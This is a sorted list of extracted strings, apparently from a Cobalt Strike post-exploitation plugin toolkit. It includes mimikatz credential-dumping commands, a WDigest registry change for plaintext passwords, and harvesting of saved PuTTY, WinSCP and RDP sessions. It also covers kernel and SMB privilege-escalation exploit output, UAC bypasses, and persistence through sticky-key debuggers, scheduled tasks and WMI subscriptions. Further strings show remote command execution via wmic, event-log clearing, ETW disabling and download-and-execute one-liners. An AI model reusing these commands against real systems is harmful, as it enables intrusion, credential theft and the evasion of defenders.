"""SID:"
"""SMB code: "
"""SMB"
"""SOFTWARE\Classes\hello"
"""SOFTWARE\Classes\hello\"
"""SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security"
"""SOFTWARE\Microsoft\DRM"
"""SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
"""SYSTEM"
"""SafetyKatz"
"""SameWeb"
"""Saved in session, but master password prevents plaintext recovery"
"""Schedule.Service"
"""ScriptContents"
"""ScriptContents:  "
"""ScriptName"
"""ScriptName:  "
"""Scripted Web Delivery (CertUtil)"
"""SeImpersonatePrivilege"
"""SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight"
"""Security.evtx"
"""Send the payload with the grooms"
"""SerName"
"""Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"
"""Server:"
"""Service Name: "
"""SessionGopher ("
"""SessionId"
"""SessionName"
"""Sessions Path:  "
"""Set Action = taskDefinition.Actions.Create(ActionTypeExec)"
"""Set objNet = CreateObject("
"""Set objRegistry = GetObject("
"""Set regInfo = taskDefinition.RegistrationInfo"
"""Set rootFolder = service.GetFolder("
"""Set service = CreateObject("
"""Set settings = taskDefinition.settings"
"""Set taskDefinition = service.NewTask(0)"
"""Set trigger = triggers.Create(7)"
"""Set triggers = taskDefinition.triggers"
"""SetWindowLongPtr"
"""Sethc"
"""Sethc.exe\"
"""SharPersist"
"""SharpAVKB"
"""SharpChassisType"
"""SharpCheckInfo"
"""SharpDPAPI -allkeys\"
"""SharpDPAPI -dump\"
"""SharpDPAPI path not found!"
"""SharpDecryptPwd"
"""SharpDecryptPwd-1"
"""SharpDecryptPwd-2"
"""SharpDirLister"
"""SharpDomainSpray"
"""SharpDump"
"""SharpEventLog"
"""SharpExec"
"""SharpGetTitle"
"""SharpHide"
"""SharpHide-RegAuto"
"""SharpHound3.0"
"""SharpNetCheck"
"""SharpOXID-Find"
"""SharpSCshell"
"""SharpSQLDump"
"""SharpSQLTools"
"""SharpSpray"
"""SharpWeb"
"""SharpWebScan"
"""Sharpstay"
"""Sharptask"
"""Slack -full"
"""Sleep : 111 ms... End !"
"""Sleep : 112 ms... End !"
"""Sleep"
"""Sleep:  "
"""SmbHashScan"
"""SmbScan"
"""Some Service"
"""Source"
"""SpoolSystem Inject"
"""SpoolSystem Spawn"
"""SpoolSystem"
"""SshScan"
"""StartupScript.bat"
"""StateChange: ParsingHeader(cont.)"
"""StateChange: ParsingKeys(cont.)"
"""StateChange: ScanningForHeader"
"""StateChange: ScanningForHeader(cont.)"
"""Status:"
"""StdRegProv"
"""Stealer"
"""Sub WriteBinary(FileName, Buf)"
"""SunLogin"
"""SuperPuTTY Sessions"
"""Sweet Potato"
"""SweetPotato"
"""System.Core"
"""T1134"
"""TCP"
"""TargetDomain"
"""TargetUser"
"""Task Beacon to run "
"""Tasked Beacon to run "
"""Tasked beacon to get SYSTEM via spoolss"
"""Taskname"
"""Taskname:  "
"""TeamViewer"
"""Telemetry"
"""This exploit only supports Windows 10 versions 1903 - 1909"
"""TimeCreated"
"""TomcatScan"
"""TortoiseSVN"
"""Type"
"""Type: "
"""Type:"
"""URI Path: "
"""Update"
"""UploadPath"
"""UrlScan"
"""Usage: "
"""Use FTP over TLS if available"
"""Use SFTP"
"""Use x64 payload"
"""Use: sharpDPAPI [-dump] [-allkeys]\n"
"""Use: sharpDPAPI_masterkeysToClipboard\n\n"
"""Use: spoolsystem <method>\n\n"
"""UseMasterPassword"
"""User Data\\Default\\apps\\LoginAssis\\assis2.db"
"""User"
"""User:"
"""UserAccount"
"""UserAccount:  "
"""UserName"
"""UserNameHint"
"""UserRights"
"""UserRights:  "
"""Username"
"""UsernameHint"
"""Uses named pipe impersonation to gain SYSTEM via Print Spooler.\n\n"
"""Utilman"
"""Utilman.exe\"
"""VALUE Base64 encoded command to execute"
"""VncScan"
"""WMIEventSub"
"""WMIHACKER : CMD > "
"""WMIHACKER : COMMAND EXEC SUCCESS, Wait to write in reg."
"""WMIHACKER : COMMAND EXEC SUCCESS."
"""WMIHACKER : COMMAND EXECTING... "
"""WMIHACKER : Connecting..."
"""WMIHACKER : Done. Task created Wait For Exec...(Max Time is 00:59)"
"""WMIHACKER : Error on task creation"
"""WMIHACKER : File Upload Success. "
"""WMIHACKER : File Write Success. "
"""WMIHACKER : Login -> OK"
"""WMIHACKER : REG WRITE SUCCESS, Wait to read the res."
"""WMIHACKER : Target -> "
"""WMIHACKER : Task created Wait For Exec...(Max Time is 00:59)"
"""WMIHACKER : The Schedule Name is "
"""WMIHACKER : Welcome to WMIHACKER Shell"
"""WMIHACKER ERROR: "
"""WMIHACKER"
"""WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?"
"""WMIHACKER.vbs  /download  host  user  pass  localpath remotepath"
"""WMIHACKER.vbs  /shell  host  user  pass "
"""WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath"
"""WMIHACKER_cmd"
"""WMIHACKER_download"
"""WMIHACKER_shell"
"""WMIHACKER_upload"
"""WQL"
"""WScript.Network"
"""Watson"
"""WbemScripting.SWbemNamedValueSet"
"""WebScan"
"""WeblogicScan"
"""WhatCMS"
"""Win32_ScheduledJob"
"""WinSCP Sessions"
"""WinSCP"
"""Windows 10 versions 1903 - 1909"
"""Windows COM Config Consumer"
"""Windows COM Config Filter"
"""Windows NT"
"""Windows PowerShell\"
"""WindowsUpdate"
"""Winlogon"
"""WmiHashScan"
"""WmiScan"
"""WriteBinary "
"""Xmanager"
"""Yes"
"""You need to be an administrator."
"""[!] $Thread is a bad thread, moving on.."
"""[!] No valid thread handles were captured, exiting!"
"""[!] NtImpersonateThread failed, moving on.."
"""[!] OpenThreadToken failed, moving on.."
"""[!] Sending command to the elevated child"
"""[!] SetThreadToken failed, moving on.."
"""[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"
"""[!]Fail to load Hive"
"""[!]No RDP Connections History"
"""[!]Not logged in"
"""[*]Try to load Hive"
"""[*]Try to unload Hive"
"""[+] "
"""[+] Bitmap dimensions: 0x760*0x4`n"
"""[+] Bitmap dimensions: 0x770*0x4`n"
"""[+] Child PID is : $("
"""[+] Corrupting child window spmenu"
"""[+] Distance: 0x$('{0:X}' -f $Distance)"
"""[+] Importing:"
"""[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)"
"""[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
"""[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
"""[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
"""[+] PID: $NextPID"
"""[+] Ping from child, voila"
"""[+] PowerShell Token: 0x$("
"""[+] PowerShell _EPROCESS address: 0x$("
"""[+] Resuming thread.."
"""[+] SYSTEM Token: 0x$("
"""[+] SYSTEM _EPROCESS address: 0x$("
"""[+] Thread resumed!"
"""[+] Thread suspended"
"""[+] Traversing ActiveProcessLinks list"
"""[+] Trying to trigger arbitrary 'Or'.."
"""[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)"
"""[+] _EPROCESS list entry: 0x$("
"""[+]File:"
"""[+]Path:"
"""[>] Building SYSTEM impersonation token"
"""[>] Duplicating CreateProcessWithLogonW handles.."
"""[>] Starting process race"
"""[>] Starting token race"
"""[>] Wiping current impersonation token"
"""[?] Adjacent large session pool feng shui.."
"""[?] Done, got $($ThreadArray.length) thread handle(s)!"
"""[?] Success, open SYSTEM token handle: $SysTokenHandle"
"""[?] Target is Win 10"
"""[?] Target is Win 7"
"""[?] Target is Win 8"
"""[?] Target is Win 8.1"
"""[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName)"
"""\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \ "
"""\"
"""\$PuTTYPathEnding"
"""\$RDPPathEnding"
"""\$WinSCPPathEnding"
"""\*"
"""\AppData\Roaming\FileZilla\sitemanager.xml"
"""\Documents\SuperPuTTY\Sessions.xml"
"""\FileZilla.csv"
"""\IPC$"
"""\Microsoft rdp Files.csv"
"""\NTUSER.DAT"
"""\PuTTY ppk Files.csv"
"""\PuTTY.csv"
"""\RDP.csv"
"""\RSA sdtid Files.csv"
"""\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
"""\SOFTWARE\Microsoft\Terminal Server Client\Servers"
"""\SOFTWARE\SimonTatham\PuTTY\Sessions"
"""\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
"""\Software\Microsoft\Terminal Server Client\Servers\"
"""\SuperPuTTY.csv"
"""\WinSCP.csv"
"""\\"
"""\\Software\\Microsoft\\Windows\\CurrentVersion\\"
"""\\\\.\\pipe\\"
"""\\pipe\\spoolss"
"""\n"
"""\nMachineGuid"
"""\root\default:StdRegProv"
"""\t"
"""]  = "
"""] , $3["
"""] contains: binfo($bid, "
"""] eq "
"""], "
"""], $script, "
"""], %options["
"""_.evtx"
"""__          ____  __ _____   _    _          _____ _  ________ _____  "
"""__EventFilter"
"""__FilterToConsumerBinding"
"""__ProviderArchitecture"
"""__RequiredArchitecture"
"""_pipe\"
"""`n[!] Buffer contains invalid data, quitting..`n"
"""`n[!] Bug did not trigger, try again or patched?`n"
"""`n[!] Duplicating SYSTEM token!`n"
"""`n[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
"""`n[!] Success, spawning a system shell!"
"""`n[!] Target architecture is x64 only!`n"
"""`n[*] Sniffing out SYSTEM shell.."
"""`n[*] Sniffing out privileged impersonation token.."
"""`n[>] Choosen name : $npipeName"
"""`n[>] Duplicating SYSTEM token"
"""`n[>] Leaking SYSTEM _EPROCESS.."
"""`n[>] Leaking current _EPROCESS.."
"""`n[>] Spawn child"
"""`n[?] Creating Window objects"
"""`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
"""`n[?] Success, reading beyond worker bitmap size!"
"""`n[?] Thread handle list:"
"""`n[?] Trying thread handle: $Thread"
"""a"
"""action=BackdoorLNK command=\"
"""action=CreateService servicename=$3['servicename'] command=\"
"""action=NewLNK filepath=\"
"""action=WMIEventSub command=\"
"""action=create keyvalue="
"""action=delete"
"""admin"
"""admin$"
"""admin@123"
"""admin@123."
"""administrative session:[a-z]:(.*)"
"""administrator"
"""administrators"
"""advapi32.dll"
"""all -full"
"""all but last fragment of exploit packet"
"""all"
"""arg1 arg2"
"""args"
"""args:  "
"""args:"
"""arguments"
"""arguments:  "
"""arrData=ReadBinary("
"""attime"
"""attime:  "
"""attrib +h +s $1"
"""attrib -h -s $1"
"""automatic"
"""aux"
"""aws"
"""azure"
"""b64_content = Base64Encode(content, false)"
"""beacon"
"""beacons.task"
"""bid"
"""bin.base64"
"""blocketw"
"""bob.smith"
"""bookmarks"
"""brief"
"""browsers"
"""build"
"""bypassuac"
"""byte"
"""c:/"
"""c:\\123.txt"
"""c:\\Windows\\system32\\cmd.exe"
"""c:\\calc"
"""c:\\windows\\Temp\\123.txt"
"""c:\\windows\\system32\\calc.exe"
"""c:\\windows\\system32\\cmd.exe /c calc"
"""c:\\windows\\system32\\werfault.exe"
"""c:\\windows\\temp"
"""c:\\windows\\temp\\123.txt"
"""c:\\windows\\temp\\123.zip"
"""c:\\windows\\temp\\nc.exe"
"""c:\\windows\\temp\\payload.exe"
"""c:\\www\\html"
"""c:\windows\system32\cmd.exe /c "
"""c:\windows\system32\cmd.exe"
"""can't send after socket shutdowncrypto/aes: input not full blockend outside usable address spacemheap.allocSpan called with no Pnon-Go code disabled sigaltstacknumerical argument out of domainpanic while printing panic valuereflect.nameFrom: tag too long: reflect: NumIn of non-func type reflect: NumOut of non-func typeremovespecial on invalid pointerresource temporarily unavailableruntime: mcall function returnedruntime: newstack called from g=runtime: root level max pages = runtime: stack split at bad timeruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prevscanstack: goroutine not stoppedslice bounds out of range [%x::]slice bounds out of range [:%x:]slice bounds out of range [::%x]software caused connection abortsweep increased allocation countuse of closed network connection of method on nil interface value142108547152020037174224853515625710542735760100185871124267578125GODEBUG: no value specified for "
"""chats"
"""check"
"""chfs.exe --port= $+ $port --path=\"
"""chrome"
"""cmd /c start \"
"""cmd"
"""cmd.exe"
"""cmd:  "
"""cmd: "
"""cmdpath"
"""cmdpath:  "
"""command"
"""command:  "
"""command: "
"""computer"
"""computerdefaults"
"""computername"
"""computername/*dc*/All"
"""computername:  "
"""content"
"""content:  "
"""content:"
"""content= ts.readall"
"""continue"
"""cookies"
"""copy"
"""crack"
"""crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread"
"""credit_cards"
"""cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"
"""cscript WMIHACKER.vbs /download  $+ $host  $+ $user  $+ \"
"""cscript WMIHACKER.vbs /upload  $+ $host  $+ $user  $+ \"
"""cve-2016-7255"
"""cve-2020-0796 exploit is x64 only"
"""cve-2020-0796"
"""cve_2020_0796_exploit"
"""daily"
"""databases"
"""dazzleUP"
"""dc123.com"
"""del /f /s /q $3['filename']"
"""del /f /s /q 360bowser.exe"
"""del /f /s /q ATPMiniDump.exe"
"""del /f /s /q chfs.exe"
"""del /f /s /q crack.exe"
"""del /f /s /q frpc.exe"
"""del /f /s /q hack-browser-data.exe"
"""del /f /s /q iox.exe"
"""del /f /s /q lazagne.exe"
"""del /f /s /q npc.exe"
"""del /f /s /q scrying.exe"
"""delete"
"""dikcleanup"
"""dir %APPDATA%\\Microsoft\\Windows\\Recent"
"""dir \\\\.\\pipe\\\\ | findstr \"
"""dll"
"""domain admins\"
"""domain computers\"
"""domain"
"""domain:  "
"""domain_accounts"
"""domain_computer"
"""domain_computers"
"""domain_dcadministrators"
"""domain_dcdc"
"""domain_dcgroup"
"""domain_dcldap"
"""domain_dcname"
"""domain_dcuser"
"""domain_dcuserwmi"
"""domain_group"
"""domain_online"
"""domain_sid"
"""domain_time"
"""domain_trusts"
"""domain_user"
"""domain_workstation"
"""domainadmin"
"""doskey /history"
"""downPath"
"""download"
"""eb_trans2_buffer"
"""eb_trans2_exploit"
"""eb_trans2_zero"
"""edge"
"""enable"
"""encrypt $3['path'] $3['pass']"
"""end function"
"""eventname"
"""eventname:  "
"""eventvwr"
"""exec"
"""exit"
"""explorer.exe"
"""favorite3.dat"
"""file"
"""file:  "
"""filename list or password"
"""filename list or username"
"""filename"
"""filename:  "
"""filename:"
"""filepath"
"""filepath:  "
"""findstr /s /i \"
"""firefox"
"""firewall"
"""fodhelper"
"""frpc.exe -t  $+ $Name -p  $+ $port"
"""fscan.exe -h 192.168.1.1/24 -o out.txt"
"""full address:[a-z]:(.*)"
"""function StrToBytes(ByVal sText, ByVal sTextEncoding, ByVal iBomByteCount)"
"""gSharedInfo"
"""games"
"""gatewayhostname:[a-z]:(.*)"
"""gc"
"""gcloud"
"""gdi32.dll"
"""gethtml"
"""getsystem"
"""git"
"""group"
"""group:  "
"""groupname"
"""groupname/*admin*/All"
"""groupname:  "
"""groups"
"""groups:  "
"""groups: "
"""hack-browser-data.exe"
"""hash"
"""hex"
"""hex: "
"""history"
"""host"
"""host/ip:  "
"""host:  "
"""host: "
"""hostname or IP address"
"""hostname"
"""hostname: "
"""hotfixid"
"""hourly"
"""http://127.0.0.1"
"""https://baidu.com"
"""https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe"
"""https://github.com/pandasec888"
"""iex(New-Object Net.WebClient).DownloadString('http://google.com')"
"""inject"
"""install /command:"
"""install /url:"
"""internal"
"""iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex"
"""ip"
"""ip:  "
"""ip: "
"""ips"
"""iptype"
"""juicypotato"
"""juicypotato(ms16-075)"
"""kernel32"
"""kernel32.dll"
"""lazagne"
"""lazagne.exe $arg"
"""lhost"
"""lhost: "
"""lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565"
"""listener"
"""listlog"
"""lnkicon"
"""lnkicon:  "
"""lnkname"
"""lnkname:  "
"""lnkpath"
"""lnkpath:  "
"""lnktarget"
"""lnktarget:  "
"""localfile: "
"""localpath"
"""localpath: "
"""logins"
"""logon"
"""mails"
"""maven"
"""memory"
"""meter"
"""microsoft.com"
"""mimikatz"
"""mimikatz: DPAPI Master Key SHA1"
"""mimikatz: DPAPI Master Key"
"""mimikatz: DPAPI"
"""mimikatz: SHA1"
"""misc -full"
"""modifytime"
"""modules/Intranet penetration.cna"
"""modules/Intranet.cna"
"""modules/Lateral movement.cna"
"""modules/RdpThief.cna"
"""modules/SharpDPAPI.cna"
"""modules/about.cna"
"""modules/brute force.cna"
"""modules/credential access.cna"
"""modules/discovery.cna"
"""modules/entertainment.cna"
"""modules/privilege escalation.cna"
"""modules/privilege.cna"
"""modules/system.cna"
"""ms14-058"
"""ms15-051"
"""ms16-016 exploit is x86 only"
"""ms16-016"
"""msg $username \"
"""mstsc.exe"
"""multimedia"
"""mysql"
"""name = 'eventlog'"
"""name"
"""name:  "
"""nc -l -p 8888"
"""nc"
"""nc:nc shell###shell:MSF shell###meter:MSF meter shell"
"""net accounts /domain"
"""net config workstation"
"""net group /domain"
"""net group \"
"""net localgroup administrators /domain"
"""net statistics workstation"
"""net time /domain"
"""net user $1 /domain"
"""net user $Name $Pwd /add  && net localgroup $groups $Name /add"
"""net user /domain"
"""net user guest /active:yes"
"""net view /domain"
"""net view /domain:$1"
"""net view"
"""netdom query pdc"
"""netsh advfirewall firewall add rule name=\"
"""netsh firewall show config"
"""netsh wlan show networks mode=bssid"
"""netsh wlan show profile name=\"
"""netsh wlan show profiles"
"""nltest /DCLIST:$1"
"""nltest /domain_trusts"
"""npc.exe -server= $+ $server -vkey= $+ $vkey"
"""ntdll.dll"
"""objRegistry.CreateKey 2147483650, "
"""objRegistry.GetBinaryValue 2147483650,"
"""or run \"
"""outfile"
"""outfile:  "
"""outpath"
"""outpath:  "
"""outpath: "
"""part1"
"""pass"
"""pass.txt: "
"""pass:  "
"""pass: "
"""passwd"
"""passwd:  "
"""password"
"""password:  "
"""password: "
"""path"
"""path:  "
"""path="
"""payload"
"""payload.exe||passwords*||*.txt"
"""payload:  "
"""permission"
"""php"
"""ping"
"""port"
"""port:  "
"""port: "
"""ports"
"""ports:  "
"""powerpick certutil.exe -urlcache -split -f "
"""powershell"
"""powershell.exe -nop -w hidden -c \"
"""process"
"""processid"
"""prompt for credentials:[a-z]:(.*)"
"""psexec"
"""pth"
"""query user || qwinsta"
"""qwinsta"
"""r"
"""raw"
"""read"
"""recent_ladon"
"""recenttest"
"""reg add  $+ $Prefix /f"
"""reg add  $+ $Prefix /v Debugger /t REG_SZ /d \"
"""reg add  $+ $Reg /f"
"""reg add  $+ $Reg /v Svchost /t REG_SZ /d \"
"""reg add  $+ $Reg /v Userinit /t REG_SZ /d \"
"""reg add  \"
"""reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f"
"""reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
"""reg add \"
"""reg load"
"""reg unload"
"""regInfo.Author = "
"""regInfo.Description = "
"""remotepath"
"""remotepath: "
"""retcode = objRegistry.SetBinaryValue(2147483650, "
"""rhost"
"""rhost: "
"""root/cimv2"
"""root\cimv2"
"""root\default"
"""root\subscription"
"""route print"
"""route_print"
"""rundll32.exe user32.dll,LockWorkStation"
"""rw"
"""s"
"""sc config \"
"""sc create \"
"""schtask name:  "
"""schtask time:"
"""schtask_name"
"""schtask_time"
"""schtaskbackdoor"
"""schtasks /query /fo LIST /v"
"""schtasks"
"""schtasks.exe"
"""schtasks_description"
"""schtasks_description:  "
"""schtasks_exe"
"""schtasks_name"
"""schtasks_name:  "
"""script"
"""script/RdpThief_x64.tmp"
"""scripting.filesystemobject"
"""scrying.exe -f  $+ $targets"
"""sdclt"
"""sdtid Files"
"""sekurlsa::backupkeys"
"""sekurlsa::credman"
"""sekurlsa::dpapi"
"""sekurlsa::dpapi\ndpapi::cache\nstandard::sleep 111"
"""sekurlsa::dpapi\ndpapi::cache\nstandard::sleep 112"
"""sekurlsa::ekeys"
"""sekurlsa::kerberos"
"""sekurlsa::livessp"
"""sekurlsa::logonpasswords"
"""sekurlsa::msv"
"""sekurlsa::ssp"
"""sekurlsa::tickets"
"""sekurlsa::trust"
"""sekurlsa::tspkg"
"""sekurlsa::wdigest"
"""server"
"""server: "
"""service name:  "
"""service"
"""service:  "
"""service_name"
"""servicename"
"""servicename:  "
"""sessionpath"
"""sessionpath:  "
"""set COMPlus_ETWEnabled=0"
"""set fs = createobject("
"""set ts = fs.opentextfile("
"""set ws=createobject("
"""settings.DisallowStartIfOnBatteries = False"
"""settings.Enabled = True"
"""settings.Hidden = False"
"""settings.StartWhenAvailable = True"
"""shares"
"""sharpDPAPI -dump"
"""sharpDPAPI"
"""sharpDPAPI_masterkeysToClipboard"
"""sharpchrome"
"""sharptask"
"""sharpwmi"
"""sheetname"
"""sheetname:  "
"""sheets"
"""shell"
"""shutdown -r -t 0"
"""shutdown -s -t 0"
"""sid"
"""sid:  "
"""single command mode"
"""slui"
"""smb"
"""socket error, exploit may fail "
"""socket error, exploit may fail horribly"
"""spawn"
"""spoolsystem "
"""spoolsystem"
"""spooltrigger"
"""ssh"
"""start"
"""startup"
"""svn"
"""sysadmin"
"""system -full"
"""systeminfo"
"""target"
"""target:  "
"""targets"
"""targets.txt"
"""targets.txt: "
"""targets: "
"""taskkill -f /im $3['filename']"
"""taskkill -f /im chfs.exe"
"""taskkill -f /im crack.exe"
"""taskkill -f /im frpc.exe"
"""taskkill -f /im fscan.exe & del /f /s /q fscan.exe & del /f /s /q out.txt"
"""taskkill -f /im iox.exe"
"""taskkill -f /im lazagne.exe"
"""taskkill -f /im modify.exe"
"""taskkill -f /im npc.exe"
"""taskkill -f /im scrying.exe"
"""test"
"""testservice"
"""the command to run on remote host"
"""thread"
"""thread:  "
"""thread: "
"""time"
"""time:  "
"""triage "
"""true"
"""ts.close"
"""type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
"""type %temp%\\data.bin"
"""type"
"""type:  "
"""type: "
"""type:"
"""uarchhistory3.db"
"""uhistory3.db"
"""ui0rkJ7dIzf2ahlxNbZP/1sf3sHMniDIDMj_xY900/C_wB21yl-bT3gKG7GFYz/yL6jG0qLbKWzEMWyzYXw"
"""update"
"""upload"
"""uri"
"""url"
"""url:  "
"""urn:schemas-microsoft-com:asm.v3"
"""user -full"
"""user"
"""user.txt: "
"""user32.dll"
"""user:  "
"""user: "
"""username"
"""username/*admin*/All"
"""username:  "
"""username: "
"""utf-16le"
"""utf-8"
"""val=ws.regwrite(path&"
"""vault::cred /patch"
"""vbscript"
"""view_domain"
"""vkey"
"""vkey: "
"""wbemscripting.swbemlocator"
"""wevtutil cl \"
"""wget"
"""whoami /all"
"""whoami"
"""whoami\"
"""wifi"
"""win7.sun.com"
"""win7/win7.sun.com"
"""windows"
"""winmgmts:{impersonationLevel=impersonate}!\\"
"""wmi"
"""wmi.txt"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] PATH win32_terminalservicesetting WHERE (__Class!=\"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] RDTOGGLE WHERE ServerName=\'$3['hostname']\' call SetAllowTSConnections 0"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] RDTOGGLE WHERE ServerName=\'$3['hostname']\' call SetAllowTSConnections 1"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] process call create \'cmd.exe /c REG ADD \"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] process call create \'cmd.exe /c netsh advfirewall firewall add rule name=\"
"""wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0"
"""wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1"
"""wmic process get caption,commandline,processid /value"
"""wmic process get caption,executablepath,commandline"
"""wmic product get name,version"
"""wmic qfe get Caption,Description,HotFixID,InstalledOn"
"""wmic service list brief"
"""wmic share get name,path"
"""wmic startup get command,caption"
"""wmic useraccount get /all"
"""workstation"
"""wql"
"""wscript.shell"
"""x64"
"""x64.dll"
"""x64: "
"""x86"
"""x86.dll"
"""xp"
"""{0:X}"
"""{0}"
"""| measure"
